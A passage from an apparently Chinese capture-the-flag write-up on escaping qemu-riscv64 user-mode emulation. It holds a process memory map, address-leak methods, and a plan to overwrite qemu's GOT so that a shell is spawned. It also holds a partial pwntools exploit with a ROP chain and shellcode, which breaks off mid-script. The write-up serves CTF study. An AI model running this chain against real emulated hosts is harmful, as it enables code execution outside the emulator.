class="line">0x00007ffff75ce000 0x00007ffff75d5000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0</span><br><span class="line">0x00007ffff75d5000 0x00007ffff75e6000 0x0000000000007000 r-x /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0</span><br><span class="line">0x00007ffff75e6000 0x00007ffff7604000 0x0000000000018000 r-- /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0</span><br><span class="line">0x00007ffff7604000 0x00007ffff7605000 0x0000000000035000 r-- /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0</span><br><span class="line">0x00007ffff7605000 0x00007ffff7606000 0x0000000000036000 rw- /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0</span><br><span class="line">0x00007ffff7606000 0x00007ffff7608000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7608000 0x00007ffff7611000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libnettle.so.7.0</span><br><span class="line">0x00007ffff7611000 0x00007ffff762f000 0x0000000000009000 r-x /usr/lib/x86_64-linux-gnu/libnettle.so.7.0</span><br><span class="line">0x00007ffff762f000 0x00007ffff763f000 0x0000000000027000 r-- /usr/lib/x86_64-linux-gnu/libnettle.so.7.0</span><br><span class="line">0x00007ffff763f000 0x00007ffff7641000 0x0000000000036000 r-- /usr/lib/x86_64-linux-gnu/libnettle.so.7.0</span><br><span class="line">0x00007ffff7641000 0x00007ffff7642000 0x0000000000038000 rw- /usr/lib/x86_64-linux-gnu/libnettle.so.7.0</span><br><span class="line">0x00007ffff7642000 0x00007ffff7645000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0</span><br><span class="line">0x00007ffff7645000 0x00007ffff7651000 0x0000000000003000 r-x /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0</span><br><span class="line">0x00007ffff7651000 0x00007ffff7655000 0x000000000000f000 r-- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0</span><br><span class="line">0x00007ffff7655000 0x00007ffff7656000 0x0000000000013000 --- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0</span><br><span class="line">0x00007ffff7656000 0x00007ffff7657000 0x0000000000013000 r-- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0</span><br><span class="line">0x00007ffff7657000 0x00007ffff7658000 0x0000000000014000 rw- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0</span><br><span class="line">0x00007ffff7658000 0x00007ffff7668000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0</span><br><span class="line">0x00007ffff7668000 0x00007ffff769e000 0x0000000000010000 r-x /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0</span><br><span class="line">0x00007ffff769e000 0x00007ffff77d5000 0x0000000000046000 r-- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0</span><br><span class="line">0x00007ffff77d5000 0x00007ffff77d6000 0x000000000017d000 --- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0</span><br><span class="line">0x00007ffff77d6000 0x00007ffff77d9000 0x000000000017d000 r-- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0</span><br><span class="line">0x00007ffff77d9000 0x00007ffff77da000 0x0000000000180000 rw- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0</span><br><span class="line">0x00007ffff77da000 0x00007ffff77dc000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6</span><br><span class="line">0x00007ffff77dc000 0x00007ffff77e1000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6</span><br><span class="line">0x00007ffff77e1000 0x00007ffff77f8000 0x0000000000007000 r-- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6</span><br><span class="line">0x00007ffff77f8000 0x00007ffff77f9000 0x000000000001e000 --- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6</span><br><span class="line">0x00007ffff77f9000 0x00007ffff77fa000 0x000000000001e000 r-- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6</span><br><span class="line">0x00007ffff77fa000 0x00007ffff77fb000 0x000000000001f000 rw- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6</span><br><span class="line">0x00007ffff77fb000 0x00007ffff7826000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0</span><br><span class="line">0x00007ffff7826000 0x00007ffff78c0000 0x000000000002b000 r-x /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0</span><br><span class="line">0x00007ffff78c0000 0x00007ffff791c000 0x00000000000c5000 r-- /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0</span><br><span class="line">0x00007ffff791c000 0x00007ffff7927000 0x0000000000120000 r-- /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0</span><br><span class="line">0x00007ffff7927000 0x00007ffff7931000 0x000000000012b000 rw- /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0</span><br><span class="line">0x00007ffff7931000 0x00007ffff7956000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7956000 0x00007ffff7ace000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7ace000 0x00007ffff7b18000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7b18000 0x00007ffff7b19000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7b19000 0x00007ffff7b1c000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7b1c000 0x00007ffff7b1f000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">0x00007ffff7b1f000 0x00007ffff7b25000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7b25000 0x00007ffff7b2c000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x00007ffff7b2c000 0x00007ffff7b3d000 0x0000000000007000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x00007ffff7b3d000 0x00007ffff7b42000 0x0000000000018000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x00007ffff7b42000 0x00007ffff7b43000 0x000000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x00007ffff7b43000 0x00007ffff7b44000 0x000000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">0x00007ffff7b44000 0x00007ffff7b48000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7b48000 0x00007ffff7b4b000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">0x00007ffff7b4b000 0x00007ffff7b5d000 0x0000000000003000 r-x /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">0x00007ffff7b5d000 0x00007ffff7b61000 0x0000000000015000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">0x00007ffff7b61000 0x00007ffff7b62000 0x0000000000018000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">0x00007ffff7b62000 0x00007ffff7b63000 0x0000000000019000 rw- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">0x00007ffff7b63000 0x00007ffff7b72000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">0x00007ffff7b72000 0x00007ffff7c19000 0x000000000000f000 r-x /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">0x00007ffff7c19000 0x00007ffff7cb0000 0x00000000000b6000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">0x00007ffff7cb0000 0x00007ffff7cb1000 0x000000000014c000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">0x00007ffff7cb1000 0x00007ffff7cb2000 0x000000000014d000 rw- /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">0x00007ffff7cb2000 0x00007ffff7cce000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6</span><br><span class="line">0x00007ffff7cce000 0x00007ffff7d52000 0x000000000001c000 r-x /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6</span><br><span class="line">0x00007ffff7d52000 0x00007ffff7dd7000 0x00000000000a0000 r-- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dd8000 0x0000000000125000 --- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6</span><br><span class="line">0x00007ffff7dd8000 0x00007ffff7dd9000 0x0000000000125000 r-- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6</span><br><span class="line">0x00007ffff7dd9000 0x00007ffff7dda000 0x0000000000126000 rw- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6</span><br><span class="line">0x00007ffff7dda000 0x00007ffff7ddb000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7ddb000 0x00007ffff7e0a000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0</span><br><span class="line">0x00007ffff7e0a000 0x00007ffff7f2c000 0x000000000002f000 r-x /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0</span><br><span class="line">0x00007ffff7f2c000 0x00007ffff7f9d000 0x0000000000151000 r-- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0</span><br><span class="line">0x00007ffff7f9d000 0x00007ffff7f9e000 0x00000000001c2000 --- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0</span><br><span class="line">0x00007ffff7f9e000 0x00007ffff7fad000 0x00000000001c2000 r-- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0</span><br><span class="line">0x00007ffff7fad000 0x00007ffff7faf000 0x00000000001d1000 rw- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0</span><br><span class="line">0x00007ffff7faf000 0x00007ffff7fb1000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7fb1000 0x00007ffff7fb4000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">0x00007ffff7fb4000 0x00007ffff7fb8000 0x0000000000003000 r-x /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">0x00007ffff7fb8000 0x00007ffff7fb9000 0x0000000000007000 r-- /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">0x00007ffff7fb9000 0x00007ffff7fba000 0x0000000000008000 --- /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">0x00007ffff7fba000 0x00007ffff7fbb000 0x0000000000008000 r-- /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">0x00007ffff7fbb000 0x00007ffff7fbc000 0x0000000000009000 rw- /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">0x00007ffff7fbc000 0x00007ffff7fbe000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7fcb000 0x00007ffff7fce000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7fce000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]</span><br></pre></td></tr></table></figure>

<p>最上面的的几行就是 guest 程序的内存部分, 然后就是 qemu 的内存部分.  </p>
<p>既然在同一个地址空间中, 那么从 guest 程序中访问 qemu 内存自然也就是一件很合理的事情了. 后面就是常规的 pwn 套路了.</p>
<p>因为 qemu 开了随机化, 首先我们需要 leak qemu 和 libc 的地址. leak 地址方法目前知道有三个:</p>
<ul>
<li>读 /./proc/self/maps文件:<ul>
<li>思路来自redbud的师傅</li>
<li>可以拿到整个qemu 内存空间的地址, 推荐</li>
<li>如果读 /proc/self/maps 只能读到 guest程序自己的内存空间, qemu有个过滤操作, 具体可以参考<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/">宇轩师傅的wp</a>写的很详细.</li>
</ul>
</li>
<li>读 /proc/self/syscall 来自 0ops 师傅的思路. 具体原理自行 <code>man proc</code><ul>
<li>这个 方法我没有实践, 通过看文档中对该文件的定义觉得该方法leak的地址可能不太稳定, 不过了解一下万一哪天用得到(比如上一个方法被封了233)</li>
</ul>
</li>
<li>mmap 一块已经存在的内存, 系统会返回一块 libc 附近的内存, 从而 leak libc 地址<ul>
<li>来自enlx师傅的思路</li>
<li>这种方法leak的地址和libc的偏移不同环境下可能不一样, 需要试一下.</li>
</ul>
</li>
</ul>
<p>综上, 笔者在复现的时候选择了读 /./proc/self/maps 文件的思路. 具体利用过程如下:</p>
<ol>
<li>leak qemu 和 libc 地址</li>
<li>leak 完地址之后利用没有被 ban 的 mprotect syscall 将 qemu 的 got 所在的段改成 rwx.</li>
<li>然后把 got[mprotect] 改成 system 地址.</li>
<li>在一个地址 addr 处(该地址需要页(0x1000)对齐)写入”/bin/sh\0”</li>
<li>mprotect(addr, 0, 0)</li>
<li>PWN!</li>
</ol>
<p>完整 exp 如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> io</span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">context(bits = <span class="number">64</span>, os = <span class="string">&#x27;linux&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./main&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"><span class="comment"># io = process([&quot;./qemu-riscv64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;main&quot;])</span></span><br><span class="line">io = process([<span class="string">&quot;./qemu-riscv64&quot;</span>, <span class="string">&quot;main&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">name, val</span>):</span></span><br><span class="line">    log.info(name+<span class="string">&quot; : &quot;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line">gets_addr = <span class="number">0x00016a5a</span></span><br><span class="line">bss = <span class="number">0x00000000006f000</span></span><br><span class="line">gad1 = <span class="number">0x0001179e</span></span><br><span class="line">gad2 = <span class="number">0x00011772</span></span><br><span class="line">gad3 = <span class="number">0x0001178e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        00011772 93 07 84 b8     addi       a5,s0,-0x478</span></span><br><span class="line"><span class="string">        00011776 13 09 09 b9     addi       s2,s2,-0x470</span></span><br><span class="line"><span class="string">        0001177a 33 09 f9 40     sub        s2,s2,a5</span></span><br><span class="line"><span class="string">        0001177e 13 59 39 40     srai       s2,s2,0x3</span></span><br><span class="line"><span class="string">        00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e</span></span><br><span class="line"><span class="string">        00011786 13 04 84 b8     addi       s0,s0,-0x478</span></span><br><span class="line"><span class="string">        0001178a 81 44           c.li       s1,0x0</span></span><br><span class="line"><span class="string">                             LAB_0001178c                                    XREF[1]:     0001179a(j)  </span></span><br><span class="line"><span class="string">        0001178c 1c 60           c.ld       a5=&gt;-&gt;FUN_00010284,0x0(s0=&gt;-&gt;FUN_00010250)       = 00010284</span></span><br><span class="line"><span class="string">                                                                                             = 00010250</span></span><br><span class="line"><span class="string">        0001178e 56 86           c.mv       a2,s5</span></span><br><span class="line"><span class="string">        00011790 d2 85           c.mv       a1,s4</span></span><br><span class="line"><span class="string">        00011792 4e 85           c.mv       a0,s3</span></span><br><span class="line"><span class="string">        00011794 85 04           c.addi     s1,0x1</span></span><br><span class="line"><span class="string">        00011796 82 97           c.jalr     a5=&gt;FUN_00010284                                 undefined FUN_00010250()</span></span><br><span class="line"><span class="string">                                                                                             undefined FUN_00010284()</span></span><br><span class="line"><span class="string">        00011798 21 04           c.addi     s0,0x8</span></span><br><span class="line"><span class="string">        0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c</span></span><br><span class="line"><span class="string">                             LAB_0001179e                                    XREF[1]:     00011782(j)  </span></span><br><span class="line"><span class="string">        0001179e e2 70           c.ldsp     ra,0x38(sp)</span></span><br><span class="line"><span class="string">        000117a0 42 74           c.ldsp     s0,0x30(sp)</span></span><br><span class="line"><span class="string">        000117a2 a2 74           c.ldsp     s1,0x28(sp)</span></span><br><span class="line"><span class="string">        000117a4 02 79           c.ldsp     s2,0x20(sp)</span></span><br><span class="line"><span class="string">        000117a6 e2 69           c.ldsp     s3,0x18(sp)</span></span><br><span class="line"><span class="string">        000117a8 42 6a           c.ldsp     s4,0x10(sp)</span></span><br><span class="line"><span class="string">        000117aa a2 6a           c.ldsp     s5,0x8(sp)</span></span><br><span class="line"><span class="string">        000117ac 21 61           c.addi16sp sp,0x40</span></span><br><span class="line"><span class="string">        000117ae 82 80           ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_rop_chain</span>(<span class="params">target, a0=<span class="number">0</span>, a1=<span class="number">0</span>, a2=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = flat(&#123;</span><br><span class="line">        <span class="number">0x40</span> * <span class="number">0</span> + <span class="number">0x38</span>: gad2, <span class="comment"># jmp to gad2</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">0</span> + <span class="number">0x30</span>: target + <span class="number">0x478</span>, <span class="comment"># set s0, a5 = s0 - 0x478</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">0</span> + <span class="number">0x20</span>: target + <span class="number">0x470</span>, <span class="comment"># set s2</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x38</span>: gad3, <span class="comment"># jmp to gad3</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x18</span>: a0, <span class="comment"># set s3, a0 = s3</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x10</span>: a1, <span class="comment"># set s4, a1 = s4</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x08</span>: a2, <span class="comment"># set s5, a2 = s5</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># s1</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x20</span>: <span class="number">1</span>, <span class="comment"># s2</span></span><br><span class="line">    &#125;, length=<span class="number">0x80</span>, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_shellcode</span>(<span class="params">src</span>):</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&quot;sc.c&quot;</span>, <span class="string">&#x27;w&#x27;</span>).write(src)</span><br><span class="line">    os.system(<span class="string">&quot;riscv64-linux-gnu-gcc-10 -Wa,-R -fPIC -O0 -nostdlib sc.c -o sc&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;riscv64-linux-gnu-objcopy -S -O binary -j .text ./sc ./sc.bin&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;./sc.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">entry_addr = <span class="number">0x000101c0</span></span><br><span class="line"></span><br><span class="line">p1 = flat(</span><br><span class="line">    <span class="comment"># b&quot;flag&#123;have_you_tried_ghidra9.2_decompiler_@if_you_have_hexriscv_plz_share_it_with_me_thx:P&#125;&quot;.ljust(0x118, &#x27;\x00&#x27;),</span></span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>,</span><br><span class="line">    <span class="number">0xdeadbeef</span>, <span class="comment"># S0</span></span><br><span class="line">    gad1, <span class="comment"># ra</span></span><br><span class="line">    gen_rop_chain(gets_addr, bss),</span><br><span class="line">    gen_rop_chain(bss),</span><br><span class="line">    <span class="comment"># gen_rop_chain(entry_addr)</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sla(io, <span class="string">&quot;flag&quot;</span>, p1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">sc1_src = <span class="string">&quot;&quot;&quot;#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;sys/uio.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    static char flag_path[] = &quot;/./proc/self/maps&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int syscall(uint64_t nr, ...);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int _start()&#123;</span></span><br><span class="line"><span class="string">        char buf[0x1000];</span></span><br><span class="line"><span class="string">        int fd = syscall(__NR_openat, AT_FDCWD, flag_path, 0, 0);</span></span><br><span class="line"><span class="string">        syscall(__NR_read, fd, buf, sizeof(buf));</span></span><br><span class="line"><span class="string">        syscall(__NR_write, 1, buf, sizeof(buf));</span></span><br><span class="line"><span class="string">        syscall(__NR_read, fd, buf, sizeof(buf));</span></span><br><span class="line"><span class="string">        syscall(__NR_write, 1, buf, sizeof(buf));</span></span><br><span class="line"><span class="string">        syscall(__NR_read, 0, 0x6f000, 0x800);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    asm(</span></span><br><span class="line"><span class="string">        &quot;syscall:\\n&quot;</span></span><br><span class="line"><span class="string">            &quot;mv a7, a0\\n&quot;</span></span><br><span 